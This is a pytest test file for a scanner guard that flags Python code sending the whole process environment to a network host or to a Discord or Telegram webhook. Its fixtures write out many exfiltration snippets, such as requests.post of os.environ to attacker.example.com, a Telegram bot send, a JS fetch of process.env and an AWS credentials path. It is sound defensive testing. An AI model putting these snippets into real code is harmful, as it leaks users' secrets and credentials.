from __future__ import annotations

import re
import sys

import pytest

from agentsec.findings import Finding
from agentsec.guards.environ_dump_to_network import EnvironDumpToNetworkGuard, _code_view
from tests._timing import assert_growth
from tests.guards._common import *  # noqa: F401,F403


def _prof(root: Path) -> StackProfile:
    return mkprofile(root, features={"python"}, python_dirs=["."])


# --- environ-dump-network-sink ----------------------------------------------------------------


def test_fires_on_json_dumps_environ_sent_via_requests_post(tmp_path: Path) -> None:
    (tmp_path / "exfil.py").write_text(
        "import json, requests\n"
        "payload = json.dumps(dict(os.environ))\n"
        "requests.post('https://attacker.example.com/collect', data=payload)\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "environ-dump-to-network/environ-dump-network-sink" for f in findings)
    assert all(f.severity == "critical" for f in findings)


def test_fires_on_str_environ_sent_via_urllib(tmp_path: Path) -> None:
    (tmp_path / "exfil.py").write_text(
        "import urllib.request\n"
        "data = str(os.environ).encode()\n"
        "urllib.request.urlopen(urllib.request.Request('https://x.example.com', data=data))\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "environ-dump-to-network/environ-dump-network-sink" for f in findings)


def test_fires_on_dict_environ_passed_inline_as_json_kwarg(tmp_path: Path) -> None:
    # Miss fix: the dump is passed directly as the `json=` kwarg value, no
    # intermediate json.dumps() wrapper and no assigned variable.
    (tmp_path / "exfil.py").write_text(
        "import requests\n"
        "requests.post('https://attacker.example.com/collect', json=dict(os.environ))\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "environ-dump-to-network/environ-dump-network-sink" for f in findings)


def test_env_dump_kept_local_does_not_fire_on_unrelated_requests_post(tmp_path: Path) -> None:
    # FP fix: the dumped environment is only ever printed locally; a wholly
    # unrelated requests.post elsewhere in the file (e.g. a telemetry ping) must not make this
    # fire -- same-file co-occurrence alone over-fired here before the dataflow-link fix.
    (tmp_path / "startup.py").write_text(
        "import json, requests\n"
        "debug_dump = json.dumps(dict(os.environ))\n"
        "print(debug_dump)  # local debug logging only, never sent anywhere\n"
        "requests.post('https://telemetry.example.com/ping', json={'event': 'started'})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_fires_on_dump_inside_dict_payload_sent_later(tmp_path: Path) -> None:
    # Round-2 H3: the assignment target was read only from the dump's own line, so a dump
    # nested in a (multi-line) dict literal reached the send through `payload` unseen.
    (tmp_path / "exfil.py").write_text(
        "import json, os, requests\n"
        "payload = {\n"
        "    'host': os.uname().nodename,\n"
        "    'env': json.dumps(dict(os.environ)),\n"
        "}\n"
        "requests.post('https://attacker.example.com/c', data=payload)\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert [(f.rule, f.location) for f in findings] == [
        ("environ-dump-to-network/environ-dump-network-sink", "exfil.py:4")
    ]


def test_fires_on_dump_reassigned_before_send(tmp_path: Path) -> None:
    (tmp_path / "exfil.py").write_text(
        "import json, os, requests\n"
        "d = json.dumps(dict(os.environ))\n"
        "body = d.encode()\n"
        "requests.post('https://attacker.example.com/c', data=body)\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert [(f.rule, f.location) for f in findings] == [
        ("environ-dump-to-network/environ-dump-network-sink", "exfil.py:2")
    ]


def test_fires_when_a_later_dump_is_sent_after_a_local_one(tmp_path: Path) -> None:
    # Only the FIRST dump in the file was ever checked, so a benign local dump hid the real one.
    (tmp_path / "exfil.py").write_text(
        "import json, os, logging, requests\n"
        "logging.info(json.dumps(dict(os.environ)))\n"
        "requests.post('https://attacker.example.com/c', data=json.dumps(dict(os.environ)))\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert [(f.rule, f.location) for f in findings] == [
        ("environ-dump-to-network/environ-dump-network-sink", "exfil.py:3")
    ]


def test_fires_on_environ_copies_passed_inline(tmp_path: Path) -> None:
    # Bare copies count when they ARE the network call's argument (round-1 M2 one-liners).
    (tmp_path / "a.py").write_text(
        "requests.post('https://attacker.example.com/c', json=os.environ.copy())\n", encoding="utf-8"
    )
    (tmp_path / "b.py").write_text(
        "httpx.post('https://attacker.example.com/c', json=dict(os.environ.items()))\n", encoding="utf-8"
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["a.py:1", "b.py:1"]


def test_environ_copy_for_a_subprocess_does_not_fire(tmp_path: Path) -> None:
    # Round-2 H4 FP bait: copying the environment for a child process is ordinary. Bare
    # `dict(os.environ)` fed the webhook rule (CRITICAL on any Discord notifier that spawns a
    # build), and a variable holding the copy linked to any send that mentioned the same name.
    (tmp_path / "notify.py").write_text(
        "import os, subprocess, requests\n"
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "subprocess.run(['make'], env=dict(os.environ))\n"
        "requests.post(WEBHOOK, json={'content': 'built'})\n",
        encoding="utf-8",
    )
    (tmp_path / "build.py").write_text(
        "import os, subprocess, requests\n"
        "env = dict(os.environ)\n"
        "env['CI'] = '1'\n"
        "subprocess.run(['make'], env=env)\n"
        "requests.post('https://ci.example.com/done', timeout=env.get('T'))\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_keyword_name_matching_a_dump_variable_does_not_link(tmp_path: Path) -> None:
    # A local dump held in `data` must not link to a send through the KEYWORD NAME `data=`; only
    # the keyword's value is a reference. (`data=data` still fires: see the urllib test above.)
    (tmp_path / "startup.py").write_text(
        "import json, os, requests\n"
        "data = json.dumps(dict(os.environ))\n"
        "print(data)\n"
        "requests.post('https://telemetry.example.com/ping', data={'event': 'started'})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_fires_after_a_multiline_triple_quoted_call_argument(tmp_path: Path) -> None:
    # Round-3 H1: the closing `""")` line kept an odd quote count after string blanking, so the
    # statement splitter never saw its bracket close and the REST OF THE FILE became one
    # statement: the later `payload = ...` was never read as an assignment, and the send was
    # unlinked. The f-string payload is the same bug inside the send call itself.
    (tmp_path / "cli.py").write_text(
        "import argparse, json, os, requests\n"
        'parser = argparse.ArgumentParser(description="""\n'
        "Collects diagnostics (and uploads them).\n"
        '""")\n'
        "payload = json.dumps(dict(os.environ))\n"
        "requests.post('https://attacker.example.com/c', data=payload)\n",
        encoding="utf-8",
    )
    (tmp_path / "inline.py").write_text(
        "import json, os, requests\n"
        'requests.post("https://attacker.example.com/c", data=f"""\n'
        "env: {json.dumps(dict(os.environ))}\n"
        '""")\n',
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["cli.py:5", "inline.py:3"]


def test_string_literal_words_and_attribute_names_do_not_link(tmp_path: Path) -> None:
    # Round-3 M4 FP bait: a dict KEY string, a word in a URL literal, and an attribute name are
    # not references to a tainted variable of the same name.
    (tmp_path / "key.py").write_text(
        "payload = json.dumps(dict(os.environ))\n"
        "log.info(payload)\n"
        "requests.post(u, json={'payload': 'ping'})\n",
        encoding="utf-8",
    )
    (tmp_path / "url.py").write_text(
        "data = json.dumps(dict(os.environ))\n"
        "log.info(data)\n"
        "requests.post('https://api.example.com/data', json={'ok': 1})\n",
        encoding="utf-8",
    )
    (tmp_path / "attr.py").write_text(
        "data = json.dumps(dict(os.environ))\n"
        "log.info(data)\n"
        "result = resp.data\n"
        "requests.post(u, json=result)\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_interpolated_and_concatenated_references_still_link(tmp_path: Path) -> None:
    # Direction check for the M4 narrowing: blanking PLAIN string literals must not blank an
    # f-string interpolation, and a name outside a string (`"x" + d`, `d.encode()`) still links.
    (tmp_path / "fstr.py").write_text(
        "p = json.dumps(dict(os.environ))\nrequests.post(u, data=f'{p}')\n", encoding="utf-8"
    )
    (tmp_path / "concat.py").write_text(
        "d = str(os.environ)\nbody = 'env=' + d\nrequests.post(u, data=body.encode())\n", encoding="utf-8"
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["concat.py:1", "fstr.py:1"]


def test_prefixed_literal_followed_by_another_quote_still_links(tmp_path: Path) -> None:
    # Round-4 H1: the round-3 plain-string blanking read the CLOSING quote of an f/b-string that
    # ends in a non-word character (`f"{BASE_URL}"`) as the opening quote of a plain string, and
    # blanked everything up to the next quote on the line -- the tainted name included.
    dump = "payload = json.dumps(dict(os.environ))\n"
    sends = {
        "url": 'requests.post(f"{BASE_URL}", data=payload, headers={"User-Agent": "x"})\n',
        "concat": 'requests.post(URL, data=f"{URL}" + payload + "\\n")\n',
        "call": 'requests.post(URL, data=f"id={os.getpid()}" + payload, headers={"A": "b"})\n',
        "subscript": "requests.post(f\"{cfg['u']}\", json=payload, headers={\"A\": \"b\"})\n",
        "empty": 'requests.post(URL, data=f"" + payload + "x")\n',
        "bytes": 'requests.post(URL, data=b"/" + payload.encode() + b"/")\n',
        "hop": 'body = f"{URL}/" + payload + "tail"\nrequests.post(URL, data=body)\n',
    }
    for name, send in sends.items():
        (tmp_path / f"{name}.py").write_text(dump + send, encoding="utf-8")
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == sorted(f"{name}.py:1" for name in sends)


def test_plain_literals_after_a_prefixed_one_are_still_blanked(tmp_path: Path) -> None:
    # The direction the round-4 H1 fix trades against: a plain (or bytes) literal on the same
    # line as an f-string is still blanked, so its words never link to a tainted name.
    (tmp_path / "key.py").write_text(
        "payload = json.dumps(dict(os.environ))\nlog.info(payload)\n"
        'requests.post(f"{BASE_URL}", json={"payload": "ping"})\n',
        encoding="utf-8",
    )
    (tmp_path / "bytes.py").write_text(
        "data = json.dumps(dict(os.environ))\nlog.info(data)\n"
        "requests.post(f\"{u}\", data=b'data')\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_multiline_triple_quoted_templates_link(tmp_path: Path) -> None:
    # Round-4 M2: a newline inside a triple-quoted literal ended the statement, so a webhook
    # message template built across lines was never read as an assignment of the dump; and the
    # closing `""".format(payload)` line paired its quotes into a phantom plain string.
    files = {
        "inline": 'msg = f"""\nenv: {json.dumps(dict(os.environ))}\n"""\nrequests.post(URL, data=msg)\n',
        "hop": 'p = json.dumps(dict(os.environ))\nmsg = f"""\nenv: {p}\n"""\nrequests.post(URL, data=msg)\n',
        "concat": 'p = json.dumps(dict(os.environ))\nmsg = """\nx\n""" + p\nrequests.post(URL, data=msg)\n',
        "format": (
            'payload = json.dumps(dict(os.environ))\nrequests.post(URL, data="""\nenv: {}\n'
            '""".format(payload), headers={"A": "b"})\n'
        ),
        "percent": (
            'payload = json.dumps(dict(os.environ))\nrequests.post(URL, data="""\nenv: %s\n'
            '""" % payload, headers={"A": "b"})\n'
        ),
    }
    for name, src in files.items():
        (tmp_path / f"{name}.py").write_text(src, encoding="utf-8")
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == [
        "concat.py:1", "format.py:1", "hop.py:1", "inline.py:2", "percent.py:1",
    ]


def test_triple_quoted_literal_words_do_not_link(tmp_path: Path) -> None:
    # FP-bait for the triple-quote widening: a plain triple-quoted literal is still a literal, so
    # a tainted name's word inside it (kept by nothing: its content is blanked) does not link,
    # and a statement after it is still its own statement.
    (tmp_path / "doc.py").write_text(
        "payload = json.dumps(dict(os.environ))\nlog.info(payload)\n"
        'requests.post(URL, data="""\npayload\n""")\n',
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_pep701_same_quote_f_strings_link(tmp_path: Path) -> None:
    # Round-5 M1: Python 3.12 lets an f-string expression reuse the enclosing quote. The round-4
    # lexer closed the f-string at that inner quote, so the name after it was blanked.
    dump = "payload = json.dumps(dict(os.environ))\n"
    sends = {
        "tail": 'requests.post(URL, data=f"{cfg["x"]}{payload}")\n',
        "space": 'requests.post(URL, data=f"{os.environ["HOME"]}: {payload}")\n',
        "hop": 'msg = f"{host["name"]} {payload}"\nrequests.post(URL, data=msg)\n',
        "url": 'requests.post(f"{cfg["url"]}", data=payload, headers={"A": "b"})\n',
        "nested": 'requests.post(URL, data=f"{f"{x}"}{payload}")\n',
        "join": 'requests.post(U, data=f"{",".join(h)} {payload}")\n',
        "ternary": 'requests.post(U, data=f"{"a" if payload else "b"}")\n',
        "triple": 'requests.post(URL, data=f"""\n{cfg["h"]}: {payload}\n""")\n',
        "rf": 'requests.post(U, data=rf"{payload}\\d")\n',
    }
    for name, send in sends.items():
        (tmp_path / f"{name}.py").write_text(dump + send, encoding="utf-8")
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == sorted(f"{name}.py:1" for name in sends)


def test_literal_text_inside_an_f_string_does_not_link(tmp_path: Path) -> None:
    # Round-5 M1/M2 FP-bait: a dict key inside an f-string expression (either quote kind) and a
    # doubled-brace `{{payload}}` (literal text) are not references to the tainted name.
    src = "payload = json.dumps(dict(os.environ))\nlog.info(payload)\n"
    (tmp_path / "same.py").write_text(src + 'requests.post(U, data=f"{cfg["payload"]}")\n', encoding="utf-8")
    (tmp_path / "alt.py").write_text(src + "requests.post(U, data=f\"{row['payload']}\")\n", encoding="utf-8")
    (tmp_path / "brace.py").write_text(src + 'requests.post(U, data=f"{{payload}} {x}")\n', encoding="utf-8")
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


@pytest.mark.slow
def test_dump_link_is_linear_on_a_line_of_escaped_quotes() -> None:
    # Round-4 M1: the round-3 plain-string regex restarted at every escaped quote of an unclosed
    # line-continued string and scanned to the line's end each time (40 KB: 15.8 s). Valid Python.
    # Timed on the dump-to-send link this guard owns: the shared `strip_python_line_comment` that
    # runs before it is quadratic on the same line on its own (#1009).
    sizes = (5000, 10000, 20000, 40000)
    codes = {
        n: "payload = json.dumps(dict(os.environ))\n"
        'x = "' + '\\"' * n + '\\\n"\nrequests.post(u, data=payload)\n'
        for n in sizes
    }

    def link(n: int) -> None:
        EnvironDumpToNetworkGuard._dump_sent_line(_code_view(codes[n]), codes[n])

    assert_growth(link, sizes, expected="linear")
    assert EnvironDumpToNetworkGuard._dump_sent_line(_code_view(codes[5000]), codes[5000]) == 1


def test_a_hash_in_a_triple_quoted_f_string_spec_does_not_hide_the_link(tmp_path: Path) -> None:
    # Round-6 H1: a `#` in a format spec (`{color:#x}`) was cut as a comment line by line before the
    # round-5 lexer ran, leaving `{color:` open, and the literal ran to the end of the file.
    tail = "payload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n"
    banners = {
        "hex": 'banner = f"""\nColor: {color:#x}\n"""\n',
        "pad": "banner = f'''\nId: {n:#06x}\n'''\n",
        "indented": 'def show(color):\n    return f"""\n    {color:#o}\n    """\n',
    }
    for name, banner in banners.items():
        (tmp_path / f"{name}.py").write_text(banner + tail, encoding="utf-8")
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["hex.py:4", "indented.py:5", "pad.py:4"]


def test_format_spec_text_does_not_link(tmp_path: Path) -> None:
    # Round-6 L1/L2 FP-bait: `=d` after `:` and `\N{DASH}` inside a spec are spec text, not names.
    src = "d = json.dumps(dict(os.environ))\nDASH = d\nlog.info(d)\n"
    (tmp_path / "walrus.py").write_text(src + 'requests.post(U, data=f"{n:=d}")\n', encoding="utf-8")
    (tmp_path / "named.py").write_text(src + 'requests.post(U, data=f"{x:\\N{DASH}>10}")\n', encoding="utf-8")
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_code_view_keeps_only_code_tokens() -> None:
    # The by-name link reads Python's own tokenizer (round 6): strings, f-string text, format specs,
    # comments and docstrings are blank at unchanged offsets; f-string expressions are code.
    from agentsec.guards.environ_dump_to_network import _code_view

    src = (
        '"""doc payload"""\n'
        "x = f\"{cfg['payload']} {p!r:>{w}} {{lit}}\"  # payload\n"
        "y = (1,\n     2)\n"
    )
    cv = _code_view(src)
    assert cv is not None
    view, stmts = cv
    assert len(view) == len(src)
    assert re.findall(r"\w+", view) == ["x", "cfg", "p", "r", "w", "y", "1", "2"]
    assert [src[s:e].split()[0] for s, e in stmts] == ['"""doc', "x", "y"]


def test_a_file_that_does_not_tokenize_keeps_only_the_inline_check(tmp_path: Path) -> None:
    # Round 6: with no token stream (here an unclosed bracket at EOF), the by-name link is not
    # followed, and the inline check still runs on the stripped text. Disclosed in the wiki. (A
    # Python 2 `print "x"` still tokenizes, so it keeps the full link.)
    (tmp_path / "inline.py").write_text(
        "requests.post(URL, data=json.dumps(dict(os.environ)))\nfoo(\n", encoding="utf-8"
    )
    (tmp_path / "byname.py").write_text(
        "payload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\nfoo(\n",
        encoding="utf-8",
    )
    (tmp_path / "py2.py").write_text(
        'print "x"\npayload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n',
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["inline.py:1", "py2.py:2"]


def test_a_nul_byte_file_does_not_take_the_guard_down(tmp_path: Path) -> None:
    # Round-7 H1: a NUL after an indented block makes tokenize raise SystemError (a CPython bug),
    # which escaped the guard and dropped every finding in the repo, the real exfil file's too.
    (tmp_path / "decoy.py").write_text("if x:\n    y = 1\n\x00z = 2\nos.environ\n", encoding="utf-8")
    (tmp_path / "exfil.py").write_text(
        "payload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n", encoding="utf-8"
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert [f.location for f in findings] == ["exfil.py:1"]
    assert _code_view("def f():\n    a = 1\n    \x00\n") is None  # degraded, not raised


def test_a_file_the_tokenizer_rejects_keeps_exactly_the_inline_check(tmp_path: Path) -> None:
    # Round 8: any tokenizer failure (here a latin-1 string `read()` mangled into `"caf\"`, and a
    # t-string under a Python older than 3.14) falls back to the inline check on the stripped
    # text, as round 6 did. By-name is not followed there (disclosed); inline still
    # fires, including a dump on the very line the tokenizer rejects inside a multi-line call
    # (round-8 M1). Python 3.14's own tokenizer reads a t-string, so there the link is followed.
    tail = "payload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n"
    (tmp_path / "latin1.py").write_text('x = "caf\\"\n' + tail, encoding="utf-8")
    (tmp_path / "tstring.py").write_text('t"{"\'"}"\n' + tail, encoding="utf-8")
    (tmp_path / "inline.py").write_text(
        'requests.post(\n    URL,\n    data=json.dumps(dict(os.environ)), note="caf\\"\n)\n', encoding="utf-8"
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    tstring_tokenizes = sys.version_info >= (3, 14)
    assert sorted(f.location for f in findings) == ["inline.py:3", *(["tstring.py:2"] if tstring_tokenizes else [])]


def test_a_dump_only_the_view_shows_still_feeds_the_webhook_rule(tmp_path: Path) -> None:
    # Round-9 L2: the dump the tokenizer view finds (behind a `#` inside `f"{d["#"]}"`, which cuts
    # the stripped text's line) is also the webhook rule's exfil signal, not only the sink gate's.
    (tmp_path / "hook.py").write_text(
        'body = f"{d["#"]}" + str(os.environ)\n'
        'requests.post("https://discord.com/api/webhooks/1/x", json={"content": "hi"})\n',
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert [(f.rule, f.location) for f in findings] == [
        ("environ-dump-to-network/credential-exfil-via-webhook", "hook.py:2")
    ]


def test_an_unterminated_docstring_example_is_not_code(tmp_path: Path) -> None:
    # Round-8 H1 FP-bait: blank-and-retry blanked the line an unterminated string starts on, so the
    # string's body (a docstring example of a dump and a send) read as code and fired CRITICAL.
    # Both shapes are the round-8 reviewer's: a latin-1 file whose `\xe9` byte read() dropped
    # (`"""Module caf\"""` no longer closes; Python itself runs it), and a truncated docstring.
    example = "        payload = json.dumps(dict(os.environ))\n        requests.post(URL, data=payload)\n"
    (tmp_path / "latin1.py").write_text(
        '# -*- coding: latin-1 -*-\n"""Module caf\\"""\ndef f():\n    """Example:\n\n'
        + example + '    """\n    return 1\n',
        encoding="utf-8",
    )
    (tmp_path / "truncated.py").write_text(
        '"""Example:\npayload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n',
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_a_tab_mixed_python2_file_keeps_the_link(tmp_path: Path) -> None:
    # Round-7 H2: indentation is never tokenized, so a Python 2 tab/space mix (TabError) still links.
    tail = "payload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n"
    (tmp_path / "tabs.py").write_text("if x:\n\tif y:\n        z = 1\n" + tail, encoding="utf-8")
    assert [f.location for f in EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))] == ["tabs.py:4"]


def test_a_dump_comprehension_with_a_short_comment_still_links(tmp_path: Path) -> None:
    # The character window is the pre-round-7 one (80 characters), so a short comment inside
    # the comprehension still fits. (A comment long enough to exhaust the window is a disclosed miss.)
    (tmp_path / "c.py").write_text(
        "payload = {\n    k: v  # all of it\n    for k, v in os.environ.items()\n}\n"
        "requests.post(URL, json=payload)\n",
        encoding="utf-8",
    )
    assert [f.location for f in EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))] == ["c.py:1"]


def test_an_allow_listed_env_subset_is_not_a_dump(tmp_path: Path) -> None:
    # Round-8 M2 FP-bait: a comprehension that keeps only named variables is not the whole
    # environment; the round-7 whitespace-run window counted each name as one unit and fired.
    # This holds only because 11 names run past the 80-character window: a short allow-list still
    # reads as a dump (pre-existing; disclosed in the wiki, tracked in #1118).
    names = ", ".join(f'"VAR_{i}"' for i in range(11))
    (tmp_path / "m.py").write_text(
        f"subset = {{k: v for k, v in os.environ.items() if k in ({names})}}\nrequests.post(URL, json=subset)\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_each_view_gate_clause_opens_the_check(tmp_path: Path) -> None:
    # Round-8 M3: a `#` inside `f"{d["#"]}"` cuts the stripped text's line, so only the tokenizer
    # view shows what follows. One file per gate clause: a dump that is not also a copy
    # (`str(os.environ)`), and a bare copy (`os.environ.copy()`).
    (tmp_path / "dump.py").write_text(
        'requests.post(URL, data=f"{d["#"]}" + str(os.environ))\n', encoding="utf-8"
    )
    (tmp_path / "copy.py").write_text(
        'requests.post(URL, data=f"{d["#"]}", json=os.environ.copy())\n', encoding="utf-8"
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["copy.py:1", "dump.py:1"]


def test_any_tokenizer_exception_degrades_instead_of_raising(monkeypatch: pytest.MonkeyPatch) -> None:
    # Round-7 H1: tokenize can raise more than TokenError (SystemError on a NUL after an indented
    # block, UnicodeDecodeError on a lone CR); none may escape the guard.
    import tokenize

    from agentsec.guards import environ_dump_to_network as mod

    def boom(_readline: object) -> object:
        raise RuntimeError("tokenizer bug")

    monkeypatch.setattr(mod.tokenize, "generate_tokens", boom)
    assert mod._code_view("x = 1\n") is None
    assert tokenize is mod.tokenize


def test_many_tab_mixed_lines_keep_the_link(tmp_path: Path) -> None:
    # Round-7 H2: indentation is never tokenized, so a Python 2 file with many tab/space mixes
    # (each one a TabError if indentation were read) still keeps its link.
    block = "".join(f"if a{i}:\n\tif b:\n        c = {i}\n" for i in range(15))
    (tmp_path / "py2.py").write_text(
        block + "payload = json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n", encoding="utf-8"
    )
    assert [f.location for f in EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))] == ["py2.py:46"]


def test_a_hash_inside_an_f_string_key_does_not_hide_the_dump(tmp_path: Path) -> None:
    # Round-7 M2: the comment-stripped text cut the line at the `#` inside `d["#"]`, so the gate
    # never saw the dump after it; the gate reads the tokenizer view too.
    (tmp_path / "inline.py").write_text(
        'requests.post(URL, data=f"{d["#"]}" + json.dumps(dict(os.environ)))\n', encoding="utf-8"
    )
    (tmp_path / "byname.py").write_text(
        'payload = f"{d["#"]}" + json.dumps(dict(os.environ))\nrequests.post(URL, data=payload)\n',
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert sorted(f.location for f in findings) == ["byname.py:1", "inline.py:1"]


def test_the_first_carrying_call_sets_the_reported_line(tmp_path: Path) -> None:
    # Round-7 L2: calls are taken in order, inline then by name, so the line an exception entry is
    # keyed on does not move when a later call carries a copy inline.
    (tmp_path / "m.py").write_text(
        "payload = json.dumps(dict(os.environ))\nrequests.post(U, data=payload)\n"
        "requests.post(U, json=os.environ.copy())\n",
        encoding="utf-8",
    )
    assert [f.location for f in EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))] == ["m.py:1"]


def test_blank_and_comment_lines_do_not_break_a_hop(tmp_path: Path) -> None:
    # Round-7 L3 (a surviving mutant): only NEWLINE ends a statement; a blank or comment line (NL)
    # between the dump, the hop and the send must not.
    (tmp_path / "m.py").write_text(
        "payload = json.dumps(dict(os.environ))\n\n# send it\nbody = payload\n\nrequests.post(U, data=body)\n",
        encoding="utf-8",
    )
    assert [f.location for f in EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))] == ["m.py:1"]


def test_a_dump_spelled_inside_a_string_argument_is_not_inline(tmp_path: Path) -> None:
    # Round-7 L3 FP-bait (a surviving mutant): the inline check reads the tokenizer view, where a
    # string argument is blank, not the stripped text that keeps one-line strings.
    (tmp_path / "m.py").write_text(
        'log.info(json.dumps(dict(os.environ)))\nrequests.post(U, data="json.dumps(dict(os.environ))")\n',
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_fires_on_annotated_assignment_of_the_dump(tmp_path: Path) -> None:
    # Round-3 M5: `payload: str = ...` (typed assignment) was not read as an assignment.
    (tmp_path / "exfil.py").write_text(
        "payload: str = json.dumps(dict(os.environ))\n"
        "requests.post('https://attacker.example.com/c', data=payload)\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert [f.location for f in findings] == ["exfil.py:1"]


def test_compound_statement_keyword_is_not_an_assignment_target(tmp_path: Path) -> None:
    # FP bait for the annotated-assignment widening: in `else: x = ...` the `else:` must not be
    # read as an annotation of a variable called `else`, which would then link to any send whose
    # arguments contain a conditional expression.
    (tmp_path / "branch.py").write_text(
        "if quiet:\n"
        "    pass\n"
        "else: snapshot = json.dumps(dict(os.environ))\n"
        "requests.post(u, json={'ok': 1} if ready else {'ok': 0})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_js_env_dump_alone_does_not_fire_known_limitation(tmp_path: Path) -> None:
    # Known, disclosed limitation: `_NETWORK_SEND` only recognizes Python network-call shapes
    # (requests/httpx/urllib/smtplib), so a JS env dump sent via fetch()/axios is not detected
    # by this guard yet -- the env-dump half alone, with no matching network-send pattern,
    # correctly stays silent rather than firing on the dump alone.
    (tmp_path / "exfil.js").write_text(
        "const payload = JSON.stringify(process.env);\n"
        "fetch('https://attacker.example.com/collect', {method: 'POST', body: payload});\n",
        encoding="utf-8",
    )
    profile = mkprofile(tmp_path, features={"javascript"})
    assert EnvironDumpToNetworkGuard().run(tmp_path, profile) == []


def test_env_dump_without_network_send_does_not_fire(tmp_path: Path) -> None:
    # FP bait: logging the whole environment locally (no network call) is not exfiltration.
    (tmp_path / "debug.py").write_text(
        "import json\n"
        "print(json.dumps(dict(os.environ)))\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_single_variable_read_does_not_fire(tmp_path: Path) -> None:
    # FP bait: reading one named variable is ordinary configuration, not a dump.
    (tmp_path / "config.py").write_text(
        "import requests\n"
        "api_key = os.environ['API_KEY']\n"
        "requests.post('https://api.example.com/x', headers={'Authorization': api_key})\n",
        encoding="utf-8",
    )
    assert EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


# --- credential-exfil-via-webhook --------------------------------------------------------------


def test_fires_on_telegram_bot_with_environ_dump(tmp_path: Path) -> None:
    (tmp_path / "grab.py").write_text(
        "import requests\n"
        "payload = str(os.environ)\n"
        "requests.post('https://api.telegram.org/bot123/sendMessage', data=payload)\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "environ-dump-to-network/credential-exfil-via-webhook" for f in findings)


def test_fires_on_discord_webhook_with_credential_store_path(tmp_path: Path) -> None:
    (tmp_path / "grab.py").write_text(
        "WEBHOOK = 'https://discord.com/api/webhooks/1/abc'\n"
        "path = os.path.expanduser('~/.aws/credentials')\n",
        encoding="utf-8",
    )
    findings = EnvironDumpToNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "environ-dump-to-network/credential-exfil-via-webhook" for f in findings)


